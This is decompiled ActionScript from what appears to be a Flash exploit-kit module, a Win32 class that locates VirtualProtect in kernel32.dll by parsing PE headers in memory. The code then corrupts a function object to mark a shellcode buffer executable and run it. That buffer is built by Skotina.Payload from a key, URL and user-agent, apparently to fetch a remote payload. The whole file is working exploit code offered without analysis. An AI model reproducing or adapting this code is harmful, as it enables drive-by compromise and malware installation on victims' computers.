package
{
   import flash.utils.*;
   
   class Win32 extends C32
   {
       
      function Win32()
      {
         super();
      }
      
      static function FindViP() : uint
      {
         var _loc1_:uint = 0;
         var _loc2_:uint = 0;
         var _loc3_:uint = 0;
         var _loc4_:uint = 0;
         var _loc5_:uint = 0;
         var _loc6_:uint = 0;
         try
         {
            _loc1_ = Get(GetAddr(_ba)) & 4294901760;
            _loc2_ = _loc1_ - 8388608;
            while(_loc3_ < 256)
            {
               if((Get(_loc2_) & 65535) == 23117)
               {
                  break;
               }
               _loc3_++;
               _loc2_ = _loc2_ - 65536;
            }
            if(_loc3_ >= 256)
            {
               Throw("");
            }
            _loc1_ = _loc2_ + Get(_loc2_ + 60);
            if(Get(_loc1_) != 17744)
            {
               Throw("");
            }
            _loc4_ = Get(_loc1_ + 132);
            _loc1_ = _loc2_ + Get(_loc1_ + 128);
            _loc3_ = 3 * 4;
            while(_loc3_ < _loc4_)
            {
               _ba.position = _loc2_ + Get(_loc1_ + _loc3_);
               if(_ba.readUTFBytes(12).toLowerCase() == "kernel32.dll")
               {
                  _loc5_ = Get(_loc1_ + _loc3_ - 3 * 4);
                  _loc6_ = Get(_loc1_ + _loc3_ + 4);
                  break;
               }
               _loc3_ = _loc3_ + 5 * 4;
            }
            if(_loc5_ == 0 || _loc6_ == 0)
            {
               Throw("");
            }
            _loc5_ = _loc5_ + _loc2_;
            _loc3_ = 0;
            while(_loc3_ < 256)
            {
               _loc1_ = Get(_loc5_);
               if(_loc1_ == 0)
               {
                  Throw("");
               }
               _ba.position = _loc2_ + _loc1_;
               if(_ba.readUTF().toLowerCase() == "virtualprotect")
               {
                  return Get(_loc2_ + _loc6_ + _loc3_ * 4);
               }
               _loc3_++;
               _loc5_ = _loc5_ + 4;
            }
         }
         catch(e:Error)
         {
         }
         return 0;
      }
      
      static function CallViP(param1:uint, param2:uint, param3:uint) : *
      {
         var _loc10_:uint = 0;
         Payload();
         var _loc4_:uint = GetAddr(Payload);
         var _loc5_:uint = Get(Get(Get(_loc4_ + 8) + 20) + 4) + (!!_dbg?188:176);
         if(Get(_loc5_) < 65536)
         {
            _loc5_ = _loc5_ + 4;
         }
         _loc5_ = Get(_loc5_);
         var _loc6_:uint = Get(_loc5_);
         var _loc7_:uint = Get(_loc4_ + 28);
         var _loc8_:uint = Get(_loc4_ + 32);
         var _loc9_:Vector.<uint> = new Vector.<uint>(256);
         while(_loc10_ < 256)
         {
            _loc9_[_loc10_] = Get(_loc6_ - 128 + _loc10_ * 4);
            _loc10_++;
         }
         _loc9_[32 + 7] = param1;
         Set(_loc4_ + 28,param2);
         Set(_loc4_ + 32,param3);
         var _loc11_:Array = new Array(65);
         Set(_loc5_,GetAddrV0(_loc9_) + 128);
         var _loc12_:* = Payload.call.apply(null,_loc11_);
         Set(_loc5_,_loc6_);
         Set(_loc4_ + 28,_loc7_);
         Set(_loc4_ + 32,_loc8_);
      }
      
      static function Exec() : *
      {
         var _loc1_:Vector.<uint> = null;
         var _loc2_:uint = 0;
         var _loc3_:uint = 0;
         var _loc4_:uint = 0;
         var _loc5_:uint = 0;
         var _loc6_:* = undefined;
         try
         {
            _loc1_ = Skotina.Payload(_key,_url,_uas);
            _loc2_ = GetAddrV0(_loc1_);
            _loc3_ = FindViP();
            if(_loc3_ == 0)
            {
               Throw("");
            }
            CallViP(_loc3_,_loc2_,_loc1_.length * 4);
            _loc4_ = GetAddr(Payload);
            _loc4_ = Get(Get(_loc4_ + 28) + 8) + 4;
            _loc5_ = Get(_loc4_);
            Set(_loc4_,_loc2_);
            _loc6_ = Payload.call(null);
            Set(_loc4_,_loc5_);
            return;
         }
         catch(e:Error)
         {
            return;
         }
      }
   }
}
